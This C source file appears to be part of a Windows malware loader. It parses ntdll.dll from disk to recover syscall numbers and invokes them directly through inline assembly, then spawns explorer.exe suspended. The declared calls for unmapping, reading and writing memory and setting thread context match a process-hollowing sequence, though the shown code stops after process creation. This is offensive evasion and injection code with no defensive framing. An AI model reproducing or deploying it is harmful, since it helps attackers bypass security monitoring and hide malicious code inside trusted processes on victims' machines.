#include <Windows.h>
#include <stdint.h>
#include "../fun.h"
#include "ntpsapi.h"

#define SET_SYSCALL(x)	__asm__ __volatile__("mov %0, %%r13d\n\t" : : "a" (x) : "%r13")

#define NTDLL_MAX	3000000

enum syscalls_e {
	SYS_CREATE = 0,
	SYS_GETCTX,
	SYS_READ,
	SYS_UNMAP,
	SYS_ALLOC,
	SYS_WRITE,
	SYS_SETCTX,
	SYS_RESUME,
	SYS_MAX,
};

typedef NTSTATUS NTAPI (*NtCreateUserProcess_t)(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList);
typedef NTSTATUS NTAPI (*NtGetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
typedef NTSTATUS NTAPI (*NtReadVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
typedef NTSTATUS NTAPI (*NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS NTAPI (*NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID* UBaseAddress, ULONG_PTR ZeroBits, PSIZE_T URegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS NTAPI (*NtWriteVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS NTAPI (*NtSetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
typedef NTSTATUS NTAPI (*NtResumeThread_t)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

void entry(main_funs_t *fun) {
	uint8_t *ntdllBuf;
	uint16_t *ordinal;
	uint32_t numSys[SYS_MAX], *funName, *funAddr, exportVA;
	wchar_t filenameNtdll[] = L"\\??\\C:\\Windows\\System32\\ntdll.dll", filenameExplorer[] = L"\\??\\C:\\Windows\\explorer.exe";
	char strSys[] = "NtCreateUserProcess\0NtGetContextThread\0NtReadVirtualMemory\0NtUnmapViewOfSection\0NtAllocateVirtualMemory\0NtWriteVirtualMemory\0NtSetContextThread\0NtResumeThread\0", *pStrSys, *name, *pName;
	PIMAGE_NT_HEADERS64 nt;
	PIMAGE_SECTION_HEADER exportSec = NULL, textSec;
	PIMAGE_EXPORT_DIRECTORY export;
	UNICODE_STRING filename;
	OBJECT_ATTRIBUTES attr;
	IO_STATUS_BLOCK statBlock;
	SIZE_T i, j, k;
	HANDLE hNtdll = NULL, hProc = NULL, hThread = NULL;
	PRTL_USER_PROCESS_PARAMETERS params = NULL;
	PS_CREATE_INFO info = {0};
	PS_ATTRIBUTE_LIST attribs;

	/*
	for (i = 0; i < sizeof(statBlock); ++i) {
		*(((PBYTE)&statBlock) + i) = 0;
	}
	*/

	fun->RtlInitUnicodeString(&filename, filenameNtdll);
	InitializeObjectAttributes(&attr, &filename, OBJ_CASE_INSENSITIVE, NULL, NULL);
	fun->NtCreateFile(&hNtdll, FILE_GENERIC_READ, &attr, &statBlock, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	ntdllBuf = (uint8_t*)fun->RtlAllocateHeap(fun->GetProcessHeap(), 0, NTDLL_MAX);
	fun->NtReadFile(hNtdll, NULL, NULL, NULL, &statBlock, ntdllBuf, NTDLL_MAX, NULL, NULL);

	nt = (PIMAGE_NT_HEADERS64)(ntdllBuf + ((PIMAGE_DOS_HEADER)ntdllBuf)->e_lfanew);
	textSec = IMAGE_FIRST_SECTION(nt);
	exportVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
		if (textSec[i].VirtualAddress <= exportVA && (textSec[i].VirtualAddress + textSec[i].Misc.VirtualSize) > exportVA) {
			exportSec = &textSec[i];
		}
	}
	
	export = (PIMAGE_EXPORT_DIRECTORY)(ntdllBuf + exportVA - exportSec->VirtualAddress + exportSec->PointerToRawData);
	funAddr = (uint32_t*)(ntdllBuf + export->AddressOfFunctions - exportSec->VirtualAddress + exportSec->PointerToRawData);
	funName = (uint32_t*)(ntdllBuf + export->AddressOfNames - exportSec->VirtualAddress + exportSec->PointerToRawData);
	ordinal = (uint16_t*)(ntdllBuf + export->AddressOfNameOrdinals - exportSec->VirtualAddress + exportSec->PointerToRawData);

	for (i = 0, k = 0; /*i < export->NumberOfFunctions ||*/ k != SYS_MAX; ++i) {
		name = (char*)(ntdllBuf + funName[i] - exportSec->VirtualAddress + exportSec->PointerToRawData);
		for (j = 0, pStrSys = strSys; *pStrSys; ++j) {
			pName = name;
			while (*pStrSys && (*pStrSys == *pName)) {
				++pStrSys;
				++pName;
			}

			if (!(*(uint8_t*)pStrSys - *(uint8_t*)pName)) {
				numSys[j] = *(uint32_t*)(ntdllBuf + funAddr[ordinal[i]] - textSec->VirtualAddress + textSec->PointerToRawData + 4);
				++k;
				break;
			}


			for (; *pStrSys; ++pStrSys) {}
			++pStrSys;
		}
	}

	fun->RtlInitUnicodeString(&filename, filenameExplorer);
	fun->RtlCreateProcessParametersEx(&params, &filename, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
	info.Size = sizeof(PS_CREATE_INFO);
	info.State = PsCreateInitialState;
	attribs.TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	attribs.Attributes.Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	attribs.Attributes.Size = filename.Length;
	attribs.Attributes.Value = (ULONG_PTR)filename.Buffer;
	attribs.Attributes.ReturnLength = 0;
	SET_SYSCALL(numSys[SYS_CREATE]);
	((NtCreateUserProcess_t)fun->sys_uni)(&hProc, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, params, &info, &attribs);
	return;
}
